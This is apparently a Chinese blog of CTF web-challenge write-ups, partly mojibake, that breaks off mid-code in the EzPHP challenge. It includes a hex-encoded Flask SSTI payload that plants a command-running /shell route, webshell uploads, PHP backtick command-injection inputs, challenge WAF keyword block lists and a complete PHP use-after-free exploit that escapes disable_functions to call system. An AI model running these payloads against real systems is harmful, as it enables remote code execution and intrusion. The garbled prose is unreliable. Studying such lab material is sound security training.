<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235433599.png" alt="image-20211125235433599"></p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200049514.png" alt="image-20211129200049514"></p>
<p>source</p>
<pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);

if (isset($_GET[&#39;source&#39;])) &#123;
  show_source(__FILE__);
  exit();
&#125;

function is_valid($str) &#123;
  $banword &#x3D; [
    &#x2F;&#x2F; no path traversal
    &#39;\.\.&#39;,
    &#x2F;&#x2F; no stream wrapper
    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,
    &#x2F;&#x2F; no data exfiltration
    &#39;flag&#39;
  ];
  $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;;
  if (preg_match($regexp, $str)) &#123;
    return false;
  &#125;
  return true;
&#125;

$body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #bodyè·å–postæ•°æ®
$json &#x3D; json_decode($body, true); #å¯¹bodyå˜é‡è¿›è¡Œjsonè§£ç 

if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#åˆ¤æ–­bodyå˜é‡æ˜¯å¦æœ‰æ•ˆï¼Œjsonæ•°æ®è¦æœ‰page
  $page &#x3D; $json[&#39;page&#39;];
  $content &#x3D; file_get_contents($page); #ä»pageä¸­è¯»å‡ºæ–‡ä»¶åï¼Œå¹¶è¯»å–æ–‡ä»¶
  if (!$content || !is_valid($content)) &#123;#æ£€æŸ¥contentæ˜¯å¦æœ‰æ•ˆ,å³ä¸èƒ½æ˜æ–‡ä¼ è¾“flagæ–‡ä»¶ï¼Œåˆ©ç”¨phpä¼ªåè®®ç»•è¿‡
    $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\n&quot;;
  &#125;
&#125; else &#123;
  $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;;
&#125;

&#x2F;&#x2F; no data exfiltration!!!
$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#å¦‚æœæŸ¥åˆ°contenté‡Œæœ‰ç›¸å…³çš„ctfå­—æ ·ï¼Œåˆ™ç”¨censoredæ›¿ä»£
echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#æœ€åå°†jsonç¼–ç åçš„contentè¾“å‡º</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200455993.png" alt="image-20211129200455993"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200943757.png" alt="image-20211129200943757"></p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>è¿›å»åæ˜¯ä¸ªçœ‹èµ·æ¥å¾ˆé«˜ç«¯çš„ç•Œé¢ï¼Œä½†æ˜¯æ³¨å†Œç„¶åç™»å½•åæœ‰ä¸ªæ˜æ˜¾ çš„ä¸Šä¼ ä½ç½®</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203949145.png" alt="image-20211129203949145"></p>
<p>é€šè¿‡æ›´æ”¹å¤´åƒä¼ ä¸ªé©¬ä¸Šå»ï¼Œèšå‰‘è¿æ¥å°±è¡Œ</p>
<p>è¿™é‡Œå‰ç«¯æœ‰ä¸ªåˆ¤æ–­å›¾ç‰‡ç±»å‹çš„åœ°æ–¹ï¼Œæ‰€ä»¥å…ˆä¼ ä¸ªjpgå†bpæŠ“åŒ…æ”¹æˆphpå°±è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129204113745.png" alt="image-20211129204113745"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203758946.png" alt="image-20211129203758946"></p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>sstiæ³¨å…¥ï¼Œç”¨ä½¿ç”¨å·¥å…·Arjunè¿›è¡Œå‚æ•°çˆ†ç ´</p>
<p>ç„¶åæ‰¾åˆ°nameå‚æ•°åï¼Œæ‹¿å‡ºçè—çš„å†™å…¥shellçš„payload</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9008">ctfä¸­flask_sstiçš„å„ç§ç»•è¿‡æŠ€å·§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<pre class="language-none"><code class="language-none">&#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x0a\x0a\x40\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x2e\x72\x6f\x75\x74\x65\x28\x27\x2f\x73\x68\x65\x6c\x6c\x27\x2c\x6d\x65\x74\x68\x6f\x64\x73\x3d\x5b\x27\x47\x45\x54\x27\x2c\x27\x50\x4f\x53\x54\x27\x5d\x29\x0a\x64\x65\x66\x20\x73\x68\x65\x6c\x6c\x28\x29\x3a\x0a\x20\x20\x20\x20\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0a\x20\x20\x20\x20\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x0a\x20\x20\x20\x20\x63\x6d\x64\x3d\x72\x65\x71\x75\x65\x73\x74\x2e\x61\x72\x67\x73\x2e\x67\x65\x74\x28\x27\x63\x6d\x64\x27\x29\x0a\x20\x20\x20\x20\x72\x74\x3d\x6f\x73\x2e\x70\x6f\x70\x65\x6e\x28\x63\x6d\x64\x29\x2e\x72\x65\x61\x64\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x72\x74&#39;) %&#125;&#123;% endif%&#125;
å…¶ä¸­çš„16è¿›åˆ¶ç¼–ç äº†åŸå§‹ä»£ç 

   </code></pre>

<p>å³</p>
<pre class="language-none"><code class="language-none">from flask import current_app

@current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])
def shell():
    import os
    from flask import request
    cmd&#x3D;request.args.get(&#39;cmd&#39;)
    rt&#x3D;os.popen(cmd).read()
    return rt</code></pre>



<p>å†™å…¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213039549.png" alt="image-20211130213039549"></p>
<p>ç„¶åç›´æ¥å†™å…¥å‘½ä»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213128899.png" alt="image-20211130213128899"></p>
<p>å¯èƒ½ä¼šå‡ºç°not foundçš„æŠ¥é”™ï¼Œå¤šè¯•å‡ æ¬¡</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213228889.png" alt="image-20211130213228889"></p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215102048.png" alt="image-20211202215102048"></p>
<p>æœ‰/secretç›®å½•ï¼Œæ‰«ä¸€ä¸‹æˆ–è€…çŒœå‡ºæ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215126891.png" alt="image-20211202215126891"></p>
<p>arjunæ‰«ä¸€ä¸‹æ˜¯å¦æœ‰ä¼ å‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215226926.png" alt="image-20211202215226926"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215244403.png" alt="image-20211202215244403"></p>
<p>å½“æ•°è¿‡å¤§æ—¶å°±ä¼šè¿›å…¥debugç•Œé¢ï¼Œè¿™æ—¶å€™åŸºæœ¬å°±ç¡®å®šè¿™æ˜¯sstiæ³¨å…¥äº†ï¼Œå¯ä»¥çœ‹çœ‹æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215324285.png" alt="image-20211202215324285"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215336677.png" alt="image-20211202215336677"></p>
<p>é‡‡ç”¨RC4åŠ å¯†çš„æ–¹å¼ï¼Œè¿™æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ï¼Œå¯¹å¯†æ–‡å†æ¬¡åŠ å¯†å°±ä¼šå˜æˆæ˜æ–‡ï¼Œå¯†é’¥æ˜¯HereIsTreasureï¼ŒçŸ¥é“è¿™ä¸ªåï¼Œåˆ©ç”¨cyberchefï¼Œå¯¹è¦è¾“å…¥çš„è¯­å¥è¿›è¡ŒåŠ å¯†ï¼Œå†å°†å¯†æ–‡ä¼ å‚è¿›å»</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215541398.png" alt="image-20211202215541398"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215555418.png" alt="image-20211202215555418"></p>
<p>èƒ½æ‰¾åˆ°æ ¹ç›®å½•ä¸‹çš„flag.txt</p>
<p>catè¯»å–</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215700231.png" alt="image-20211202215700231"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215712160.png" alt="image-20211202215712160"></p>
<p>è¿™é‡Œåº”è¯¥æ˜¯å–å·§äº†ï¼Œbuuçš„flagé‡Œä¸åŒ…å«ciscnï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡æ»¤å°±æ²¡ç”¨äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215826313.png" alt="image-20211202215826313"></p>
<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/370378373_750628">ä»ä¸€é“ctfé¢˜è°ˆè°ˆflaskå¼€å¯debugæ¨¡å¼å­˜åœ¨çš„å®‰å…¨é—®é¢˜_pin (sohu.com)</a></p>
<h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
function check($input)&#123;
    if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;
        &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123;
        die(&#39;hacker!!!&#39;);
    &#125;else&#123;
        return $input;
    &#125;
&#125;

function waf($input)&#123;
  if(is_array($input))&#123;
      foreach($input as $key&#x3D;&gt;$output)&#123;
          $input[$key] &#x3D; waf($output);
      &#125;
  &#125;else&#123;
      $input &#x3D; check($input);
  &#125;
&#125;

$dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;;
if(!file_exists($dir))&#123;
    mkdir($dir);
&#125;
switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;
    case &#39;pwd&#39;:
        echo $dir;
        break;
    case &#39;upload&#39;:
        $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;
        waf($data);
        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);
&#125;
?&gt;</code></pre>

<p>è¿‡æ»¤ï¼›å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ï¼Œè¿‡æ»¤evalå¯ä»¥é‡‡ç”¨åå¼•å·ï¼Œè¿‡æ»¤ç©ºæ ¼å¯ä»¥ç”¨\t</p>
<pre class="language-none"><code class="language-none">PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ&lt;??&gt;å’Œ&lt;?&#x3D;?&gt;ã€‚å…¶ä¸­ï¼Œ&lt;??&gt;ç›¸å½“äºå¯¹&lt;?php&gt;çš„æ›¿æ¢ã€‚è€Œ&lt;?&#x3D;?&gt;åˆ™æ˜¯ç›¸å½“äº&lt;? echo&gt;ã€‚</code></pre>



<pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\t&#x2F;&#96;?&gt;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206210913770.png" alt="image-20211206210913770"></p>
<pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;flllllll1112222222lag&#96;?&gt;
æˆ–è€…
?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;f*&#96;?&gt;
*ä¸ºé€šé…ç¬¦</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206211136986.png" alt="image-20211206211136986"></p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>é¢˜ç›®æ—¶thinkphp6ç‰ˆæœ¬çš„æ¼æ´</p>
<p><a target="_blank" rel="noopener" href="https://ld246.com/article/1579965339516">ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ - é“¾æ»´ (ld246.com)</a></p>
<p>åªéœ€è¦æ„é€  PHPSESSID çš„å€¼å³å¯ï¼Œå€¼ä¸º <code>string</code>&amp;&amp;é•¿åº¦ä¸º 32</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="tp.png"></p>
<p>æ­¤æ—¶æŸ¥çœ‹ä¸€ä¸‹ç”Ÿæˆçš„ sessionï¼Œç”Ÿæˆçš„ session æ–‡ä»¶ä¿å­˜åœ¨ <code>\runtime\session</code> ä¸‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="sessionphp.png"></p>
<p>session é‡Œçš„å†…å®¹:</p>
<pre class="language-json" data-language="json"><code class="language-json">a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125;</code></pre>

<p>å¯ä»¥çœ‹åˆ° session çš„å†…å®¹ç»è¿‡äº†åºåˆ—åŒ–æ“ä½œï¼Œåªè¦å°† session çš„å†…å®¹ååºåˆ—åŒ–å³å¯ getshell</p>
<hr>
<p>è¿™ä¸ªå¸ˆå‚…æ„é€ äº†ä¸€ä¸ªå‘SESSIONä¸­å†™å…¥å€¼çš„ç±»å’Œå‡½æ•°ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­ï¼Œæœç´¢çš„å†…å®¹ç›´æ¥è¢«å†™å…¥äº†SESSIONï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯æˆ‘ä¹Ÿçœ‹ä¸æ‡‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205225749.png" alt="image-20211208205225749"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹sessionä¸º.phpçš„åç¼€ï¼Œç„¶å</p>
<p>åœ¨æœç´¢æ é‡Œæœä¸ªé©¬ï¼Œå°±å¯ä»¥åœ¨/runtime/sessionè·¯å¾„ä¸‹è®¿é—®å¹¶æ‰§è¡Œè¿™ä¸ªé©¬</p>
<p>å…ˆè¯•è¯•phpinfo</p>
<p>/runtime/session/sess_0123456789012345678901234568.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208203421218.png" alt="image-20211208203421218"></p>
<p>å†™ä¸ªä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205558736.png" alt="image-20211208205558736"></p>
<p>èšå‰‘è¿æ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205849571.png" alt="image-20211208205849571"></p>
<p>æ ¹ç›®å½•åˆflagä½†æ˜¯æ‰“å¼€æ²¡ä¸œè¥¿ï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶,çŒœæµ‹æ˜¯è¦æ‰§è¡Œreadflagæ¥è¯»å–flagæ–‡ä»¶é‡Œçš„å†…å®¹</p>
<p>ä½†æ˜¯åœ¨è™šæ‹Ÿç»ˆç«¯æ— æ³•æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210015627.png" alt="image-20211208210015627"></p>
<p>ç»“åˆphpinfoé‡Œçš„ç¦ç”¨å‡½æ•°</p>
<p>èƒ½å¾—å‡ºè¿™æ˜¯ä¸ªçªç ´disable_functioné™åˆ¶æ‰§è¡Œå‘½ä»¤çš„è€ƒç‚¹</p>
<p>ä¹‹å‰[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEä¹Ÿæœ‰è¿™ä¸ªè€ƒç‚¹ï¼ˆå¾€ä¸Šç¿»</p>
<p>ä½†æ˜¯åœ¨è¿™é“é¢˜é‡Œç”¨èšå‰‘çš„æ’ä»¶æ²¡æ³•ç»•è¿‡</p>
<p>ä¸Šä¸ªexpï¼ˆç¾¡æ…•èƒ½å†™å‡ºè¿™ç§expçš„å¤§å¸ˆå‚…</p>
<pre class="language-none"><code class="language-none">&lt;?php
pwn(&quot;&#x2F;readflag&quot;);

function pwn($cmd)
&#123;
    global $abc, $helper, $backtrace;

    class Vuln
    &#123;
        public $a;

        public function __destruct()
        &#123;
            global $backtrace;
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)
            if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper
    &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8)
    &#123;
        $address &#x3D; 0;
        for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p + $j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8)
    &#123;
        $out &#x3D; &quot;&quot;;
        for ($i &#x3D; 0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; chr($ptr &amp; 0xff);
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8)
    &#123;
        $i &#x3D; 0;
        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; chr($v &amp; 0xff);
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8)
    &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if ($s !&#x3D; 8) &#123;
            $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1;
        &#125;
        return $leak;
    &#125;

    function parse_elf($base)
    &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if (!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf)
    &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                # &#39;constant&#39; constant check
                if ($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                # &#39;bin2hex&#39; constant check
                if ($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak)
    &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs)
    &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while ($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg)
    &#123;
        # str_shuffle prevents opcache string interning
        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if (stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; # increase this value if UAF fails
    $contiguous &#x3D; [];
    for ($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123;
    &#125;;

    if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    # leaks
    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if (!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if (!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if (!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;

    # fake closure object
    $fake_obj_offset &#x3D; 0xd0;
    for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);
    exit();
&#125;
</code></pre>

<p>æŠŠè¿™ä¸ªphpæ–‡ä»¶æ‰¾ä¸ªåœ°æ–¹ä¼ ä¸Šå»</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210715741.png" alt="image-20211208210715741"></p>
<p>è®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œå¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210736589.png" alt="image-20211208210736589"></p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>è¿™ä¸ªé¢˜è´¨é‡å¥½é«˜</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211705547.png" alt="image-20211208211705547"></p>
<p>ä¸­é—´è¿™ä¸ªä¸œè¥¿é“¾æ¥å¥½åƒå¯„äº†ï¼Œä½†æ˜¯ä¸å½±å“åšé¢˜ï¼Œæºç é‡Œæœ‰ä¸²base32ï¼Œè§£ç ä¸º1nD3x.php</p>
<p>è®¿é—®è¿™ä¸ªé¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211820293.png" alt="image-20211208211820293"></p>
<pre class="language-none"><code class="language-none">&lt;?php
highlight_file(__FILE__);
error_reporting(0); 

$file &#x3D; &quot;1nD3x.php&quot;;
$shana &#x3D; $_GET[&#39;shana&#39;];
$passwd &#x3D; $_GET[&#39;passwd&#39;];
$arg &#x3D; &#39;&#39;;
$code &#x3D; &#39;&#39;;

echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;

if($_SERVER) &#123; 
    if (
  preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])
        )  
        die(&#39;You seem to want to do something bad?&#39;); 
&#125;

if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;
    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; 
        $file &#x3D; $_GET[&quot;file&quot;]; 
        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;
    &#125; 
&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);

if($_REQUEST) &#123; 
    foreach($_REQUEST as $value) &#123; 
        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  
            die(&#39;fxck you! I hate English!&#39;); 
    &#125; 
&#125; 

if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)
